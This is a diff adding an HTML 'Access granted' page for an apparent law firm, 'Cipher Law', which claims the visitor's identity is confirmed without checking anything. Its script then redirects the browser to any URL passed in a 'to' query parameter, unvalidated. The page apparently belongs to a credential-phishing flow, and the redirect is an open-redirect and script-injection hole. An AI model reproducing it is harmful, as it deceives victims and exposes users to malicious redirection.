@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Cipher Law — Verified</title>
+<link href="https://fonts.googleapis.com/css2?family=Libre+Baskerville:ital,wght@0,400;0,700;1,400&family=Jost:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+  :root{--bg:#f8f6f2;--paper:#fffdf9;--ink:#2a1f1a;--muted:#8a7d70;--line:#e0d9cc;--bordo:#7a1f2e;--gold:#b8965a;}
+  html,body{height:100%;margin:0;}
+  body{font-family:'Jost',sans-serif;background:var(--bg);color:var(--ink);display:flex;align-items:center;justify-content:center;min-height:100vh;}
+  .card{text-align:center;padding:56px 48px;max-width:460px;width:92%;background:var(--paper);border:1px solid var(--line);position:relative;box-shadow:0 30px 70px rgba(42,31,26,0.10);}
+  .card::before,.card::after{content:"";position:absolute;width:60px;height:60px;}
+  .card::before{top:12px;left:12px;border-top:1.5px solid var(--bordo);border-left:1.5px solid var(--bordo);}
+  .card::after{bottom:12px;right:12px;border-bottom:1.5px solid var(--bordo);border-right:1.5px solid var(--bordo);}
+  .ring{width:96px;height:96px;margin:0 auto 26px;border-radius:50%;border:1.5px solid var(--bordo);display:flex;align-items:center;justify-content:center;position:relative;animation:pop .6s cubic-bezier(0.2,0.9,0.3,1.2);}
+  .ring::before{content:"";position:absolute;inset:8px;border-radius:50%;background:var(--bordo);}
+  .ring svg{width:44px;height:44px;stroke:var(--paper);stroke-width:2.4;fill:none;position:relative;z-index:1;}
+  @keyframes pop{0%{transform:scale(.4);opacity:0;}65%{transform:scale(1.08);}100%{transform:scale(1);opacity:1;}}
+  h2{font-family:'Libre Baskerville',serif;font-size:32px;font-weight:400;letter-spacing:-0.015em;margin:0 0 14px;}
+  h2 em{font-style:italic;color:var(--bordo);}
+  p{font-size:14.5px;color:var(--muted);line-height:1.7;margin:0;}
+  .stamp{margin-top:32px;padding-top:24px;border-top:1px solid var(--line);display:flex;justify-content:center;gap:28px;font-family:'Libre Baskerville',serif;font-style:italic;font-size:14px;color:var(--bordo);}
+</style>
+</head>
+<body>
+  <div class="card">
+    <div class="ring">
+      <svg viewBox="0 0 24 24" fill="none">
+        <path d="M5 13l4 4L19 7" stroke="currentColor" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round"/>
+      </svg>
+    </div>
+    <h2>Access <em>granted</em>.</h2>
+    <p>Your identity has been confirmed. Redirecting to your secure file…</p>
+    <div class="stamp"><span>Verified</span><span>Privileged</span><span>Secure</span></div>
+  </div>
+  <script>
+    setTimeout(function(){
+      var d=new URLSearchParams(location.search).get("to");
+      location.href=d||"https://www.google.com";
+    },1800);
+  </script>
+</body>
+</html>
